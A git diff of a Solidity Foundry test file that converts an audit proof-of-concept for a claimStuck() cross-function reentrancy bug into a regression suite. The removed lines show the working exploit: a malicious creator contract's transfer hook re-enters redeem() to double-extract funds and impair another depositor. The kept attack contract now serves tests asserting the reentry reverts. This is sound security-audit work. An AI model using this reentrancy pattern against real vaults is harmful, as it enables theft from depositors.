@@ -1,11 +1,14 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.28;
 
-/// @dev SELF-AUDIT V1.4.0 PoC — H-NEW-1: claimStuck cross-function reentrancy.
-///      Demonstrates double extraction via a malicious CREATOR partner wallet
-///      (any wallet can be a creator — free-market #27). Becomes the permanent
-///      regression test after the fix lands (flipped to assert the attack
-///      reverts).
+/// @dev REGRESSION SUITE — audit H-NEW-1 (SELF_AUDIT_V1.4.0.md):
+///      `claimStuck()` cross-function reentrancy through a malicious partner
+///      wallet's transfer hook. The exploit (double extraction + innocent
+///      depositor impairment) was PoC-proven against commit 9da22b3 — the
+///      original failing PoCs are preserved in git history at `10ee35b`
+///      (test/unit/PoC_ClaimStuckReentrancy.t.sol). This suite pins the FIX:
+///      the reentrant call must revert, stuck funds must remain intact, and
+///      legitimate settlement must still work afterwards.
 import {Test} from "forge-std/Test.sol";
 import {DHPImplementation} from "../../src/contracts/DHPImplementation.sol";
 import {DHPFactory} from "../../src/contracts/DHPFactory.sol";
@@ -62,39 +65,43 @@ contract HookedToken {
     }
 }
 
-/// @notice The malicious CREATOR partner. Phase 1 (greed=false): its hook
-///         reverts, so the vault's _payPartner booking path kicks in and its
-///         creator share is parked as stuck revenue. Phase 2 (greed=true):
-///         the first hook call inside claimStuck's payout re-enters
-///         redeem() with its LOCKED (not-yet-burned) shares.
+/// @notice The malicious CREATOR partner. Modes: 0 = refuse payouts (books
+///         its share as stuck revenue), 1 = GREEDY (re-enters redeem() on
+///         the first hook call inside a payout window — the H-NEW-1 attack),
+///         2 = friendly (accept silently — legitimate settlement).
 contract EvilCreator {
     DHPFactory public immutable factory;
-    bool public greed;
+    uint8 public mode;
     bool public fired;
 
     constructor(DHPFactory factory_) {
         factory = factory_;
     }
 
-    function setGreed(bool g) external {
-        greed = g;
+    function setMode(uint8 mode_) external {
+        mode = mode_;
     }
 
-    /// @notice msg.sender inside the hook IS the token that moved.
+    /// @dev msg.sender inside the hook IS the token that moved.
     function onTokenTransfer(address, uint256) external {
-        if (!greed) revert("EvilCreator: refusing payout");
-        if (fired) return; // stay passive on nested hook calls
-        fired = true;
-        address vault = factory.getVault(msg.sender);
-        DHPImplementation(vault).redeem(
-            DHPImplementation(vault).balanceOf(address(this)),
-            address(this),
-            address(this)
-        );
+        if (mode == 0) revert("EvilCreator: refusing payout");
+        if (mode == 1) {
+            if (fired) return; // stay passive on nested hook calls
+            fired = true;
+            address vault = factory.getVault(msg.sender);
+            // THE ATTACK: re-enter redeem() while the outer claimStuck ledger
+            // updates are still pending. Must revert (H-NEW-1 fix).
+            DHPImplementation(vault).redeem(
+                DHPImplementation(vault).balanceOf(address(this)),
+                address(this),
+                address(this)
+            );
+        }
+        // mode == 2: friendly accept
     }
 }
 
-contract PoC_ClaimStuckReentrancy is Test {
+contract ClaimStuckReentrancyRegression is Test {
     DHPImplementation implementation;
     DHPFactory factory;
     DHPFeeCollector collector;
@@ -111,73 +118,65 @@ contract PoC_ClaimStuckReentrancy is Test {
         vm.deal(address(this), 100 ether);
     }
 
-    /// @dev The attack, end to end.
-    function test_PoC_claimStuck_reentrancy_double_extraction() public {
-        EvilCreator evil = new EvilCreator(factory);
-        token.setStrictRecipient(address(evil)); // its hook refusal reverts transfers TO it
-        DHPImplementation v = DHPImplementation(
-            factory.createVault{value: 0.004 ether}(address(token), address(evil), platform)
-        );
-
-        // 2. The attacker makes the first deposit TO ITSELF (receiver = evil),
-        //    so it holds the shares it will later double-dip on. Its creator
-        //    partner payout attempt hits the hook, which reverts => 10e18
-        //    (2% of the 500e18 entry tax) booked to stuckRevenue. The
-        //    deposit itself succeeds (no DoS).
-        token.mint(address(evil), 1_000_000e18);
-        vm.prank(address(evil));
-        token.approve(address(v), type(uint256).max);
-        vm.prank(address(evil));
-        v.deposit(10_000e18, address(evil));
-        assertEq(v.stuckRevenue(address(evil)), 10e18, "stuck booked");
-        assertTrue(v.totalSupply() > 0, "deposit succeeded");
-        uint256 evilShares = v.balanceOf(address(evil)); // ~9500e18, LOCKED for now
-        assertGt(evilShares, 0, "creator holds shares");
-        assertGt(token.balanceOf(address(evil)), 0, "creator holds change from its own deposit");
-
-        // 3. Arm the trap and let ANYONE trigger claimStuck.
-        evil.setGreed(true);
-        uint256 evilBalBefore = token.balanceOf(address(evil));
-        v.claimStuck(address(evil));
-
-        // 4. Inside the stuck payout's transfer hook, evil re-entered
-        //    redeem() while its shares were still locked. It received:
-        //    (a) the full redemption value of its shares at PRE-burn pricing
-        //        (includes the 1e18 locked in burnedBalance — value that
-        //        must never leave), and
-        //    (b) the 10e18 stuck payout afterwards.
-        //    Net balances prove double extraction:
-        uint256 evilGained = token.balanceOf(address(evil)) - evilBalBefore;
-        assertGt(evilGained, 10e18, "more than the stuck payout left the vault");
-        assertEq(v.stuckRevenue(address(evil)), 0, "ledger cleared once - no infinite drain");
-
-        // 5. The kill shot: backing is now insolvent. Alice's legitimate
-        //    full redemption reverts (insolvent pricing / ERC20 underflow).
-        uint256 aliceShares = v.balanceOf(alice);
-        vm.prank(alice);
-        vm.expectRevert();
-        v.redeem(aliceShares, alice, alice);
-    }
-
-    /// @dev Variant B — the two-depositor insolvency: evil deposits first,
-    ///      a VICTIM deposits second, then the trap fires. The reentrant
-    ///      redeem lets evil exit at pre-burn pricing while the outer
-    ///      claimStuck ledger updates land AFTER, double-counting the
-    ///      stuck liability window. Prove the vault ends up unable to pay
-    ///      the victim's full entitlement (freeze or shortfall).
-    function test_PoC_variantB_victim_insolvency() public {
-        EvilCreator evil = new EvilCreator(factory);
+    /// @dev Create a vault with the evil creator, have evil deposit to
+    ///     itself (books its 10e18 creator share as stuck revenue).
+    function _setupAttack() internal returns (EvilCreator evil, DHPImplementation v) {
+        evil = new EvilCreator(factory);
         token.setStrictRecipient(address(evil));
-        DHPImplementation v = DHPImplementation(
+        v = DHPImplementation(
             factory.createVault{value: 0.004 ether}(address(token), address(evil), platform)
         );
 
-        // Evil seeds the vault (books its 10e18 creator share as stuck).
         token.mint(address(evil), 1_000_000e18);
         vm.startPrank(address(evil));
         token.approve(address(v), type(uint256).max);
         v.deposit(10_000e18, address(evil));
         vm.stopPrank();
+
+        // The no-DoS design worked: evil's creator share (2% of the 500e18
+        // entry tax) is booked as stuck, deposit succeeded.
+        assertEq(v.stuckRevenue(address(evil)), 10e18, "stuck booked");
+        assertEq(v.totalStuckRevenue(), 10e18, "total stuck");
+        assertGt(v.balanceOf(address(evil)), 0, "evil holds locked shares");
+    }
+
+    /// @notice H-NEW-1 regression, variant A: the reentrant redeem inside the
+    ///         claimStuck payout window must REVERT; stuck funds must remain
+    ///         intact; a later legitimate settlement must still pay out.
+    function test_claimStuck_reentrancy_blocked_then_legit_claim_works() public {
+        (EvilCreator evil, DHPImplementation v) = _setupAttack();
+
+        // Arm the trap and trigger the payout.
+        evil.setMode(1);
+        uint256 evilBalBefore = token.balanceOf(address(evil));
+        uint256 evilSharesBefore = v.balanceOf(address(evil));
+        uint256 vaultBalBefore = token.balanceOf(address(v));
+
+        vm.expectRevert(); // guard kills the reentrant redeem; whole tx reverts
+        v.claimStuck(address(evil));
+
+        // Nothing moved: no extraction, no partial state, ledger intact.
+        assertEq(token.balanceOf(address(evil)), evilBalBefore, "no extraction");
+        assertEq(v.balanceOf(address(evil)), evilSharesBefore, "shares untouched");
+        assertEq(token.balanceOf(address(v)), vaultBalBefore, "vault balance untouched");
+        assertEq(v.stuckRevenue(address(evil)), 10e18, "stuck ledger intact after attack");
+        assertEq(v.totalStuckRevenue(), 10e18, "total stuck intact after attack");
+
+        // Legitimate settlement still works: evil goes friendly, ANYONE can
+        // trigger, and the entitled partner is paid exactly their stuck sum.
+        evil.setMode(2);
+        v.claimStuck(address(evil));
+        assertEq(token.balanceOf(address(evil)), evilBalBefore + 10e18, "paid exactly stuck sum");
+        assertEq(v.stuckRevenue(address(evil)), 0, "ledger cleared");
+        assertEq(v.totalStuckRevenue(), 0, "total cleared");
+    }
+
+    /// @notice H-NEW-1 regression, variant B: with an innocent second
+    ///         depositor, the blocked attack must leave the victim's full
+    ///         position redeemable and the vault solvent (pre-fix, the victim
+    ///         was silently impaired ~8.9%).
+    function test_variantB_victim_solvent_after_blocked_attack() public {
+        (EvilCreator evil, DHPImplementation v) = _setupAttack();
 
         // Victim deposits the same size.
         token.mint(alice, 1_000_000e18);
@@ -186,29 +185,32 @@ contract PoC_ClaimStuckReentrancy is Test {
         vm.prank(alice);
         v.deposit(10_000e18, alice);
         uint256 victimShares = v.balanceOf(alice);
+        assertGt(victimShares, 0, "victim holds shares");
 
-        // Trap fires.
-        evil.setGreed(true);
-        uint256 evilBefore = token.balanceOf(address(evil));
+        // Blocked attack.
+        evil.setMode(1);
+        vm.expectRevert();
         v.claimStuck(address(evil));
-        uint256 evilGain = token.balanceOf(address(evil)) - evilBefore;
-        emit log_named_uint("evil total extraction", evilGain);
-        emit log_named_uint("victim shares", victimShares);
-        emit log_named_uint("vault balance", token.balanceOf(address(v)));
-        emit log_named_uint("burnedBalance", v.burnedBalance());
-        emit log_named_uint("totalUnclaimed", v.totalUnclaimed());
-        emit log_named_uint("totalStuckRevenue", v.totalStuckRevenue());
 
-        // Does the vault still price at all?
-        bool pricingReverts = false;
-        uint256 assets = 0;
-        try v.totalAssets() returns (uint256 a) {
-            assets = a;
-        } catch {
-            pricingReverts = true;
-        }
-        emit log_named_uint("totalAssets", assets);
-        assertTrue(pricingReverts || assets < v.burnedBalance() + v.totalUnclaimed() + victimShares,
-            "victim must be impaired");
+        // The victim's full redemption must succeed at fair pricing — the
+        // pre-fix impairment path (redeem priced against a state still
+        // counting the stuck liability) is dead.
+        uint256 expected = v.previewRedeem(victimShares);
+        assertGt(expected, 0, "nonzero entitlement");
+        uint256 aliceBalBefore = token.balanceOf(alice);
+        vm.prank(alice);
+        uint256 paid = v.redeem(victimShares, alice, alice);
+        assertEq(paid, expected, "paid exactly the preview (pre-state pricing)");
+        assertEq(token.balanceOf(alice), aliceBalBefore + paid, "victim received entitlement");
+
+        // Vault remains solvent: totalAssets() does not revert and the
+        // liability-cover invariant holds by construction.
+        uint256 assets = v.totalAssets();
+        assertGe(
+            token.balanceOf(address(v)),
+            v.burnedBalance() + v.totalUnclaimed() + v.totalStuckRevenue(),
+            "balance covers all liabilities"
+        );
+        assertGe(assets, 0, "pricing alive");
     }
 }
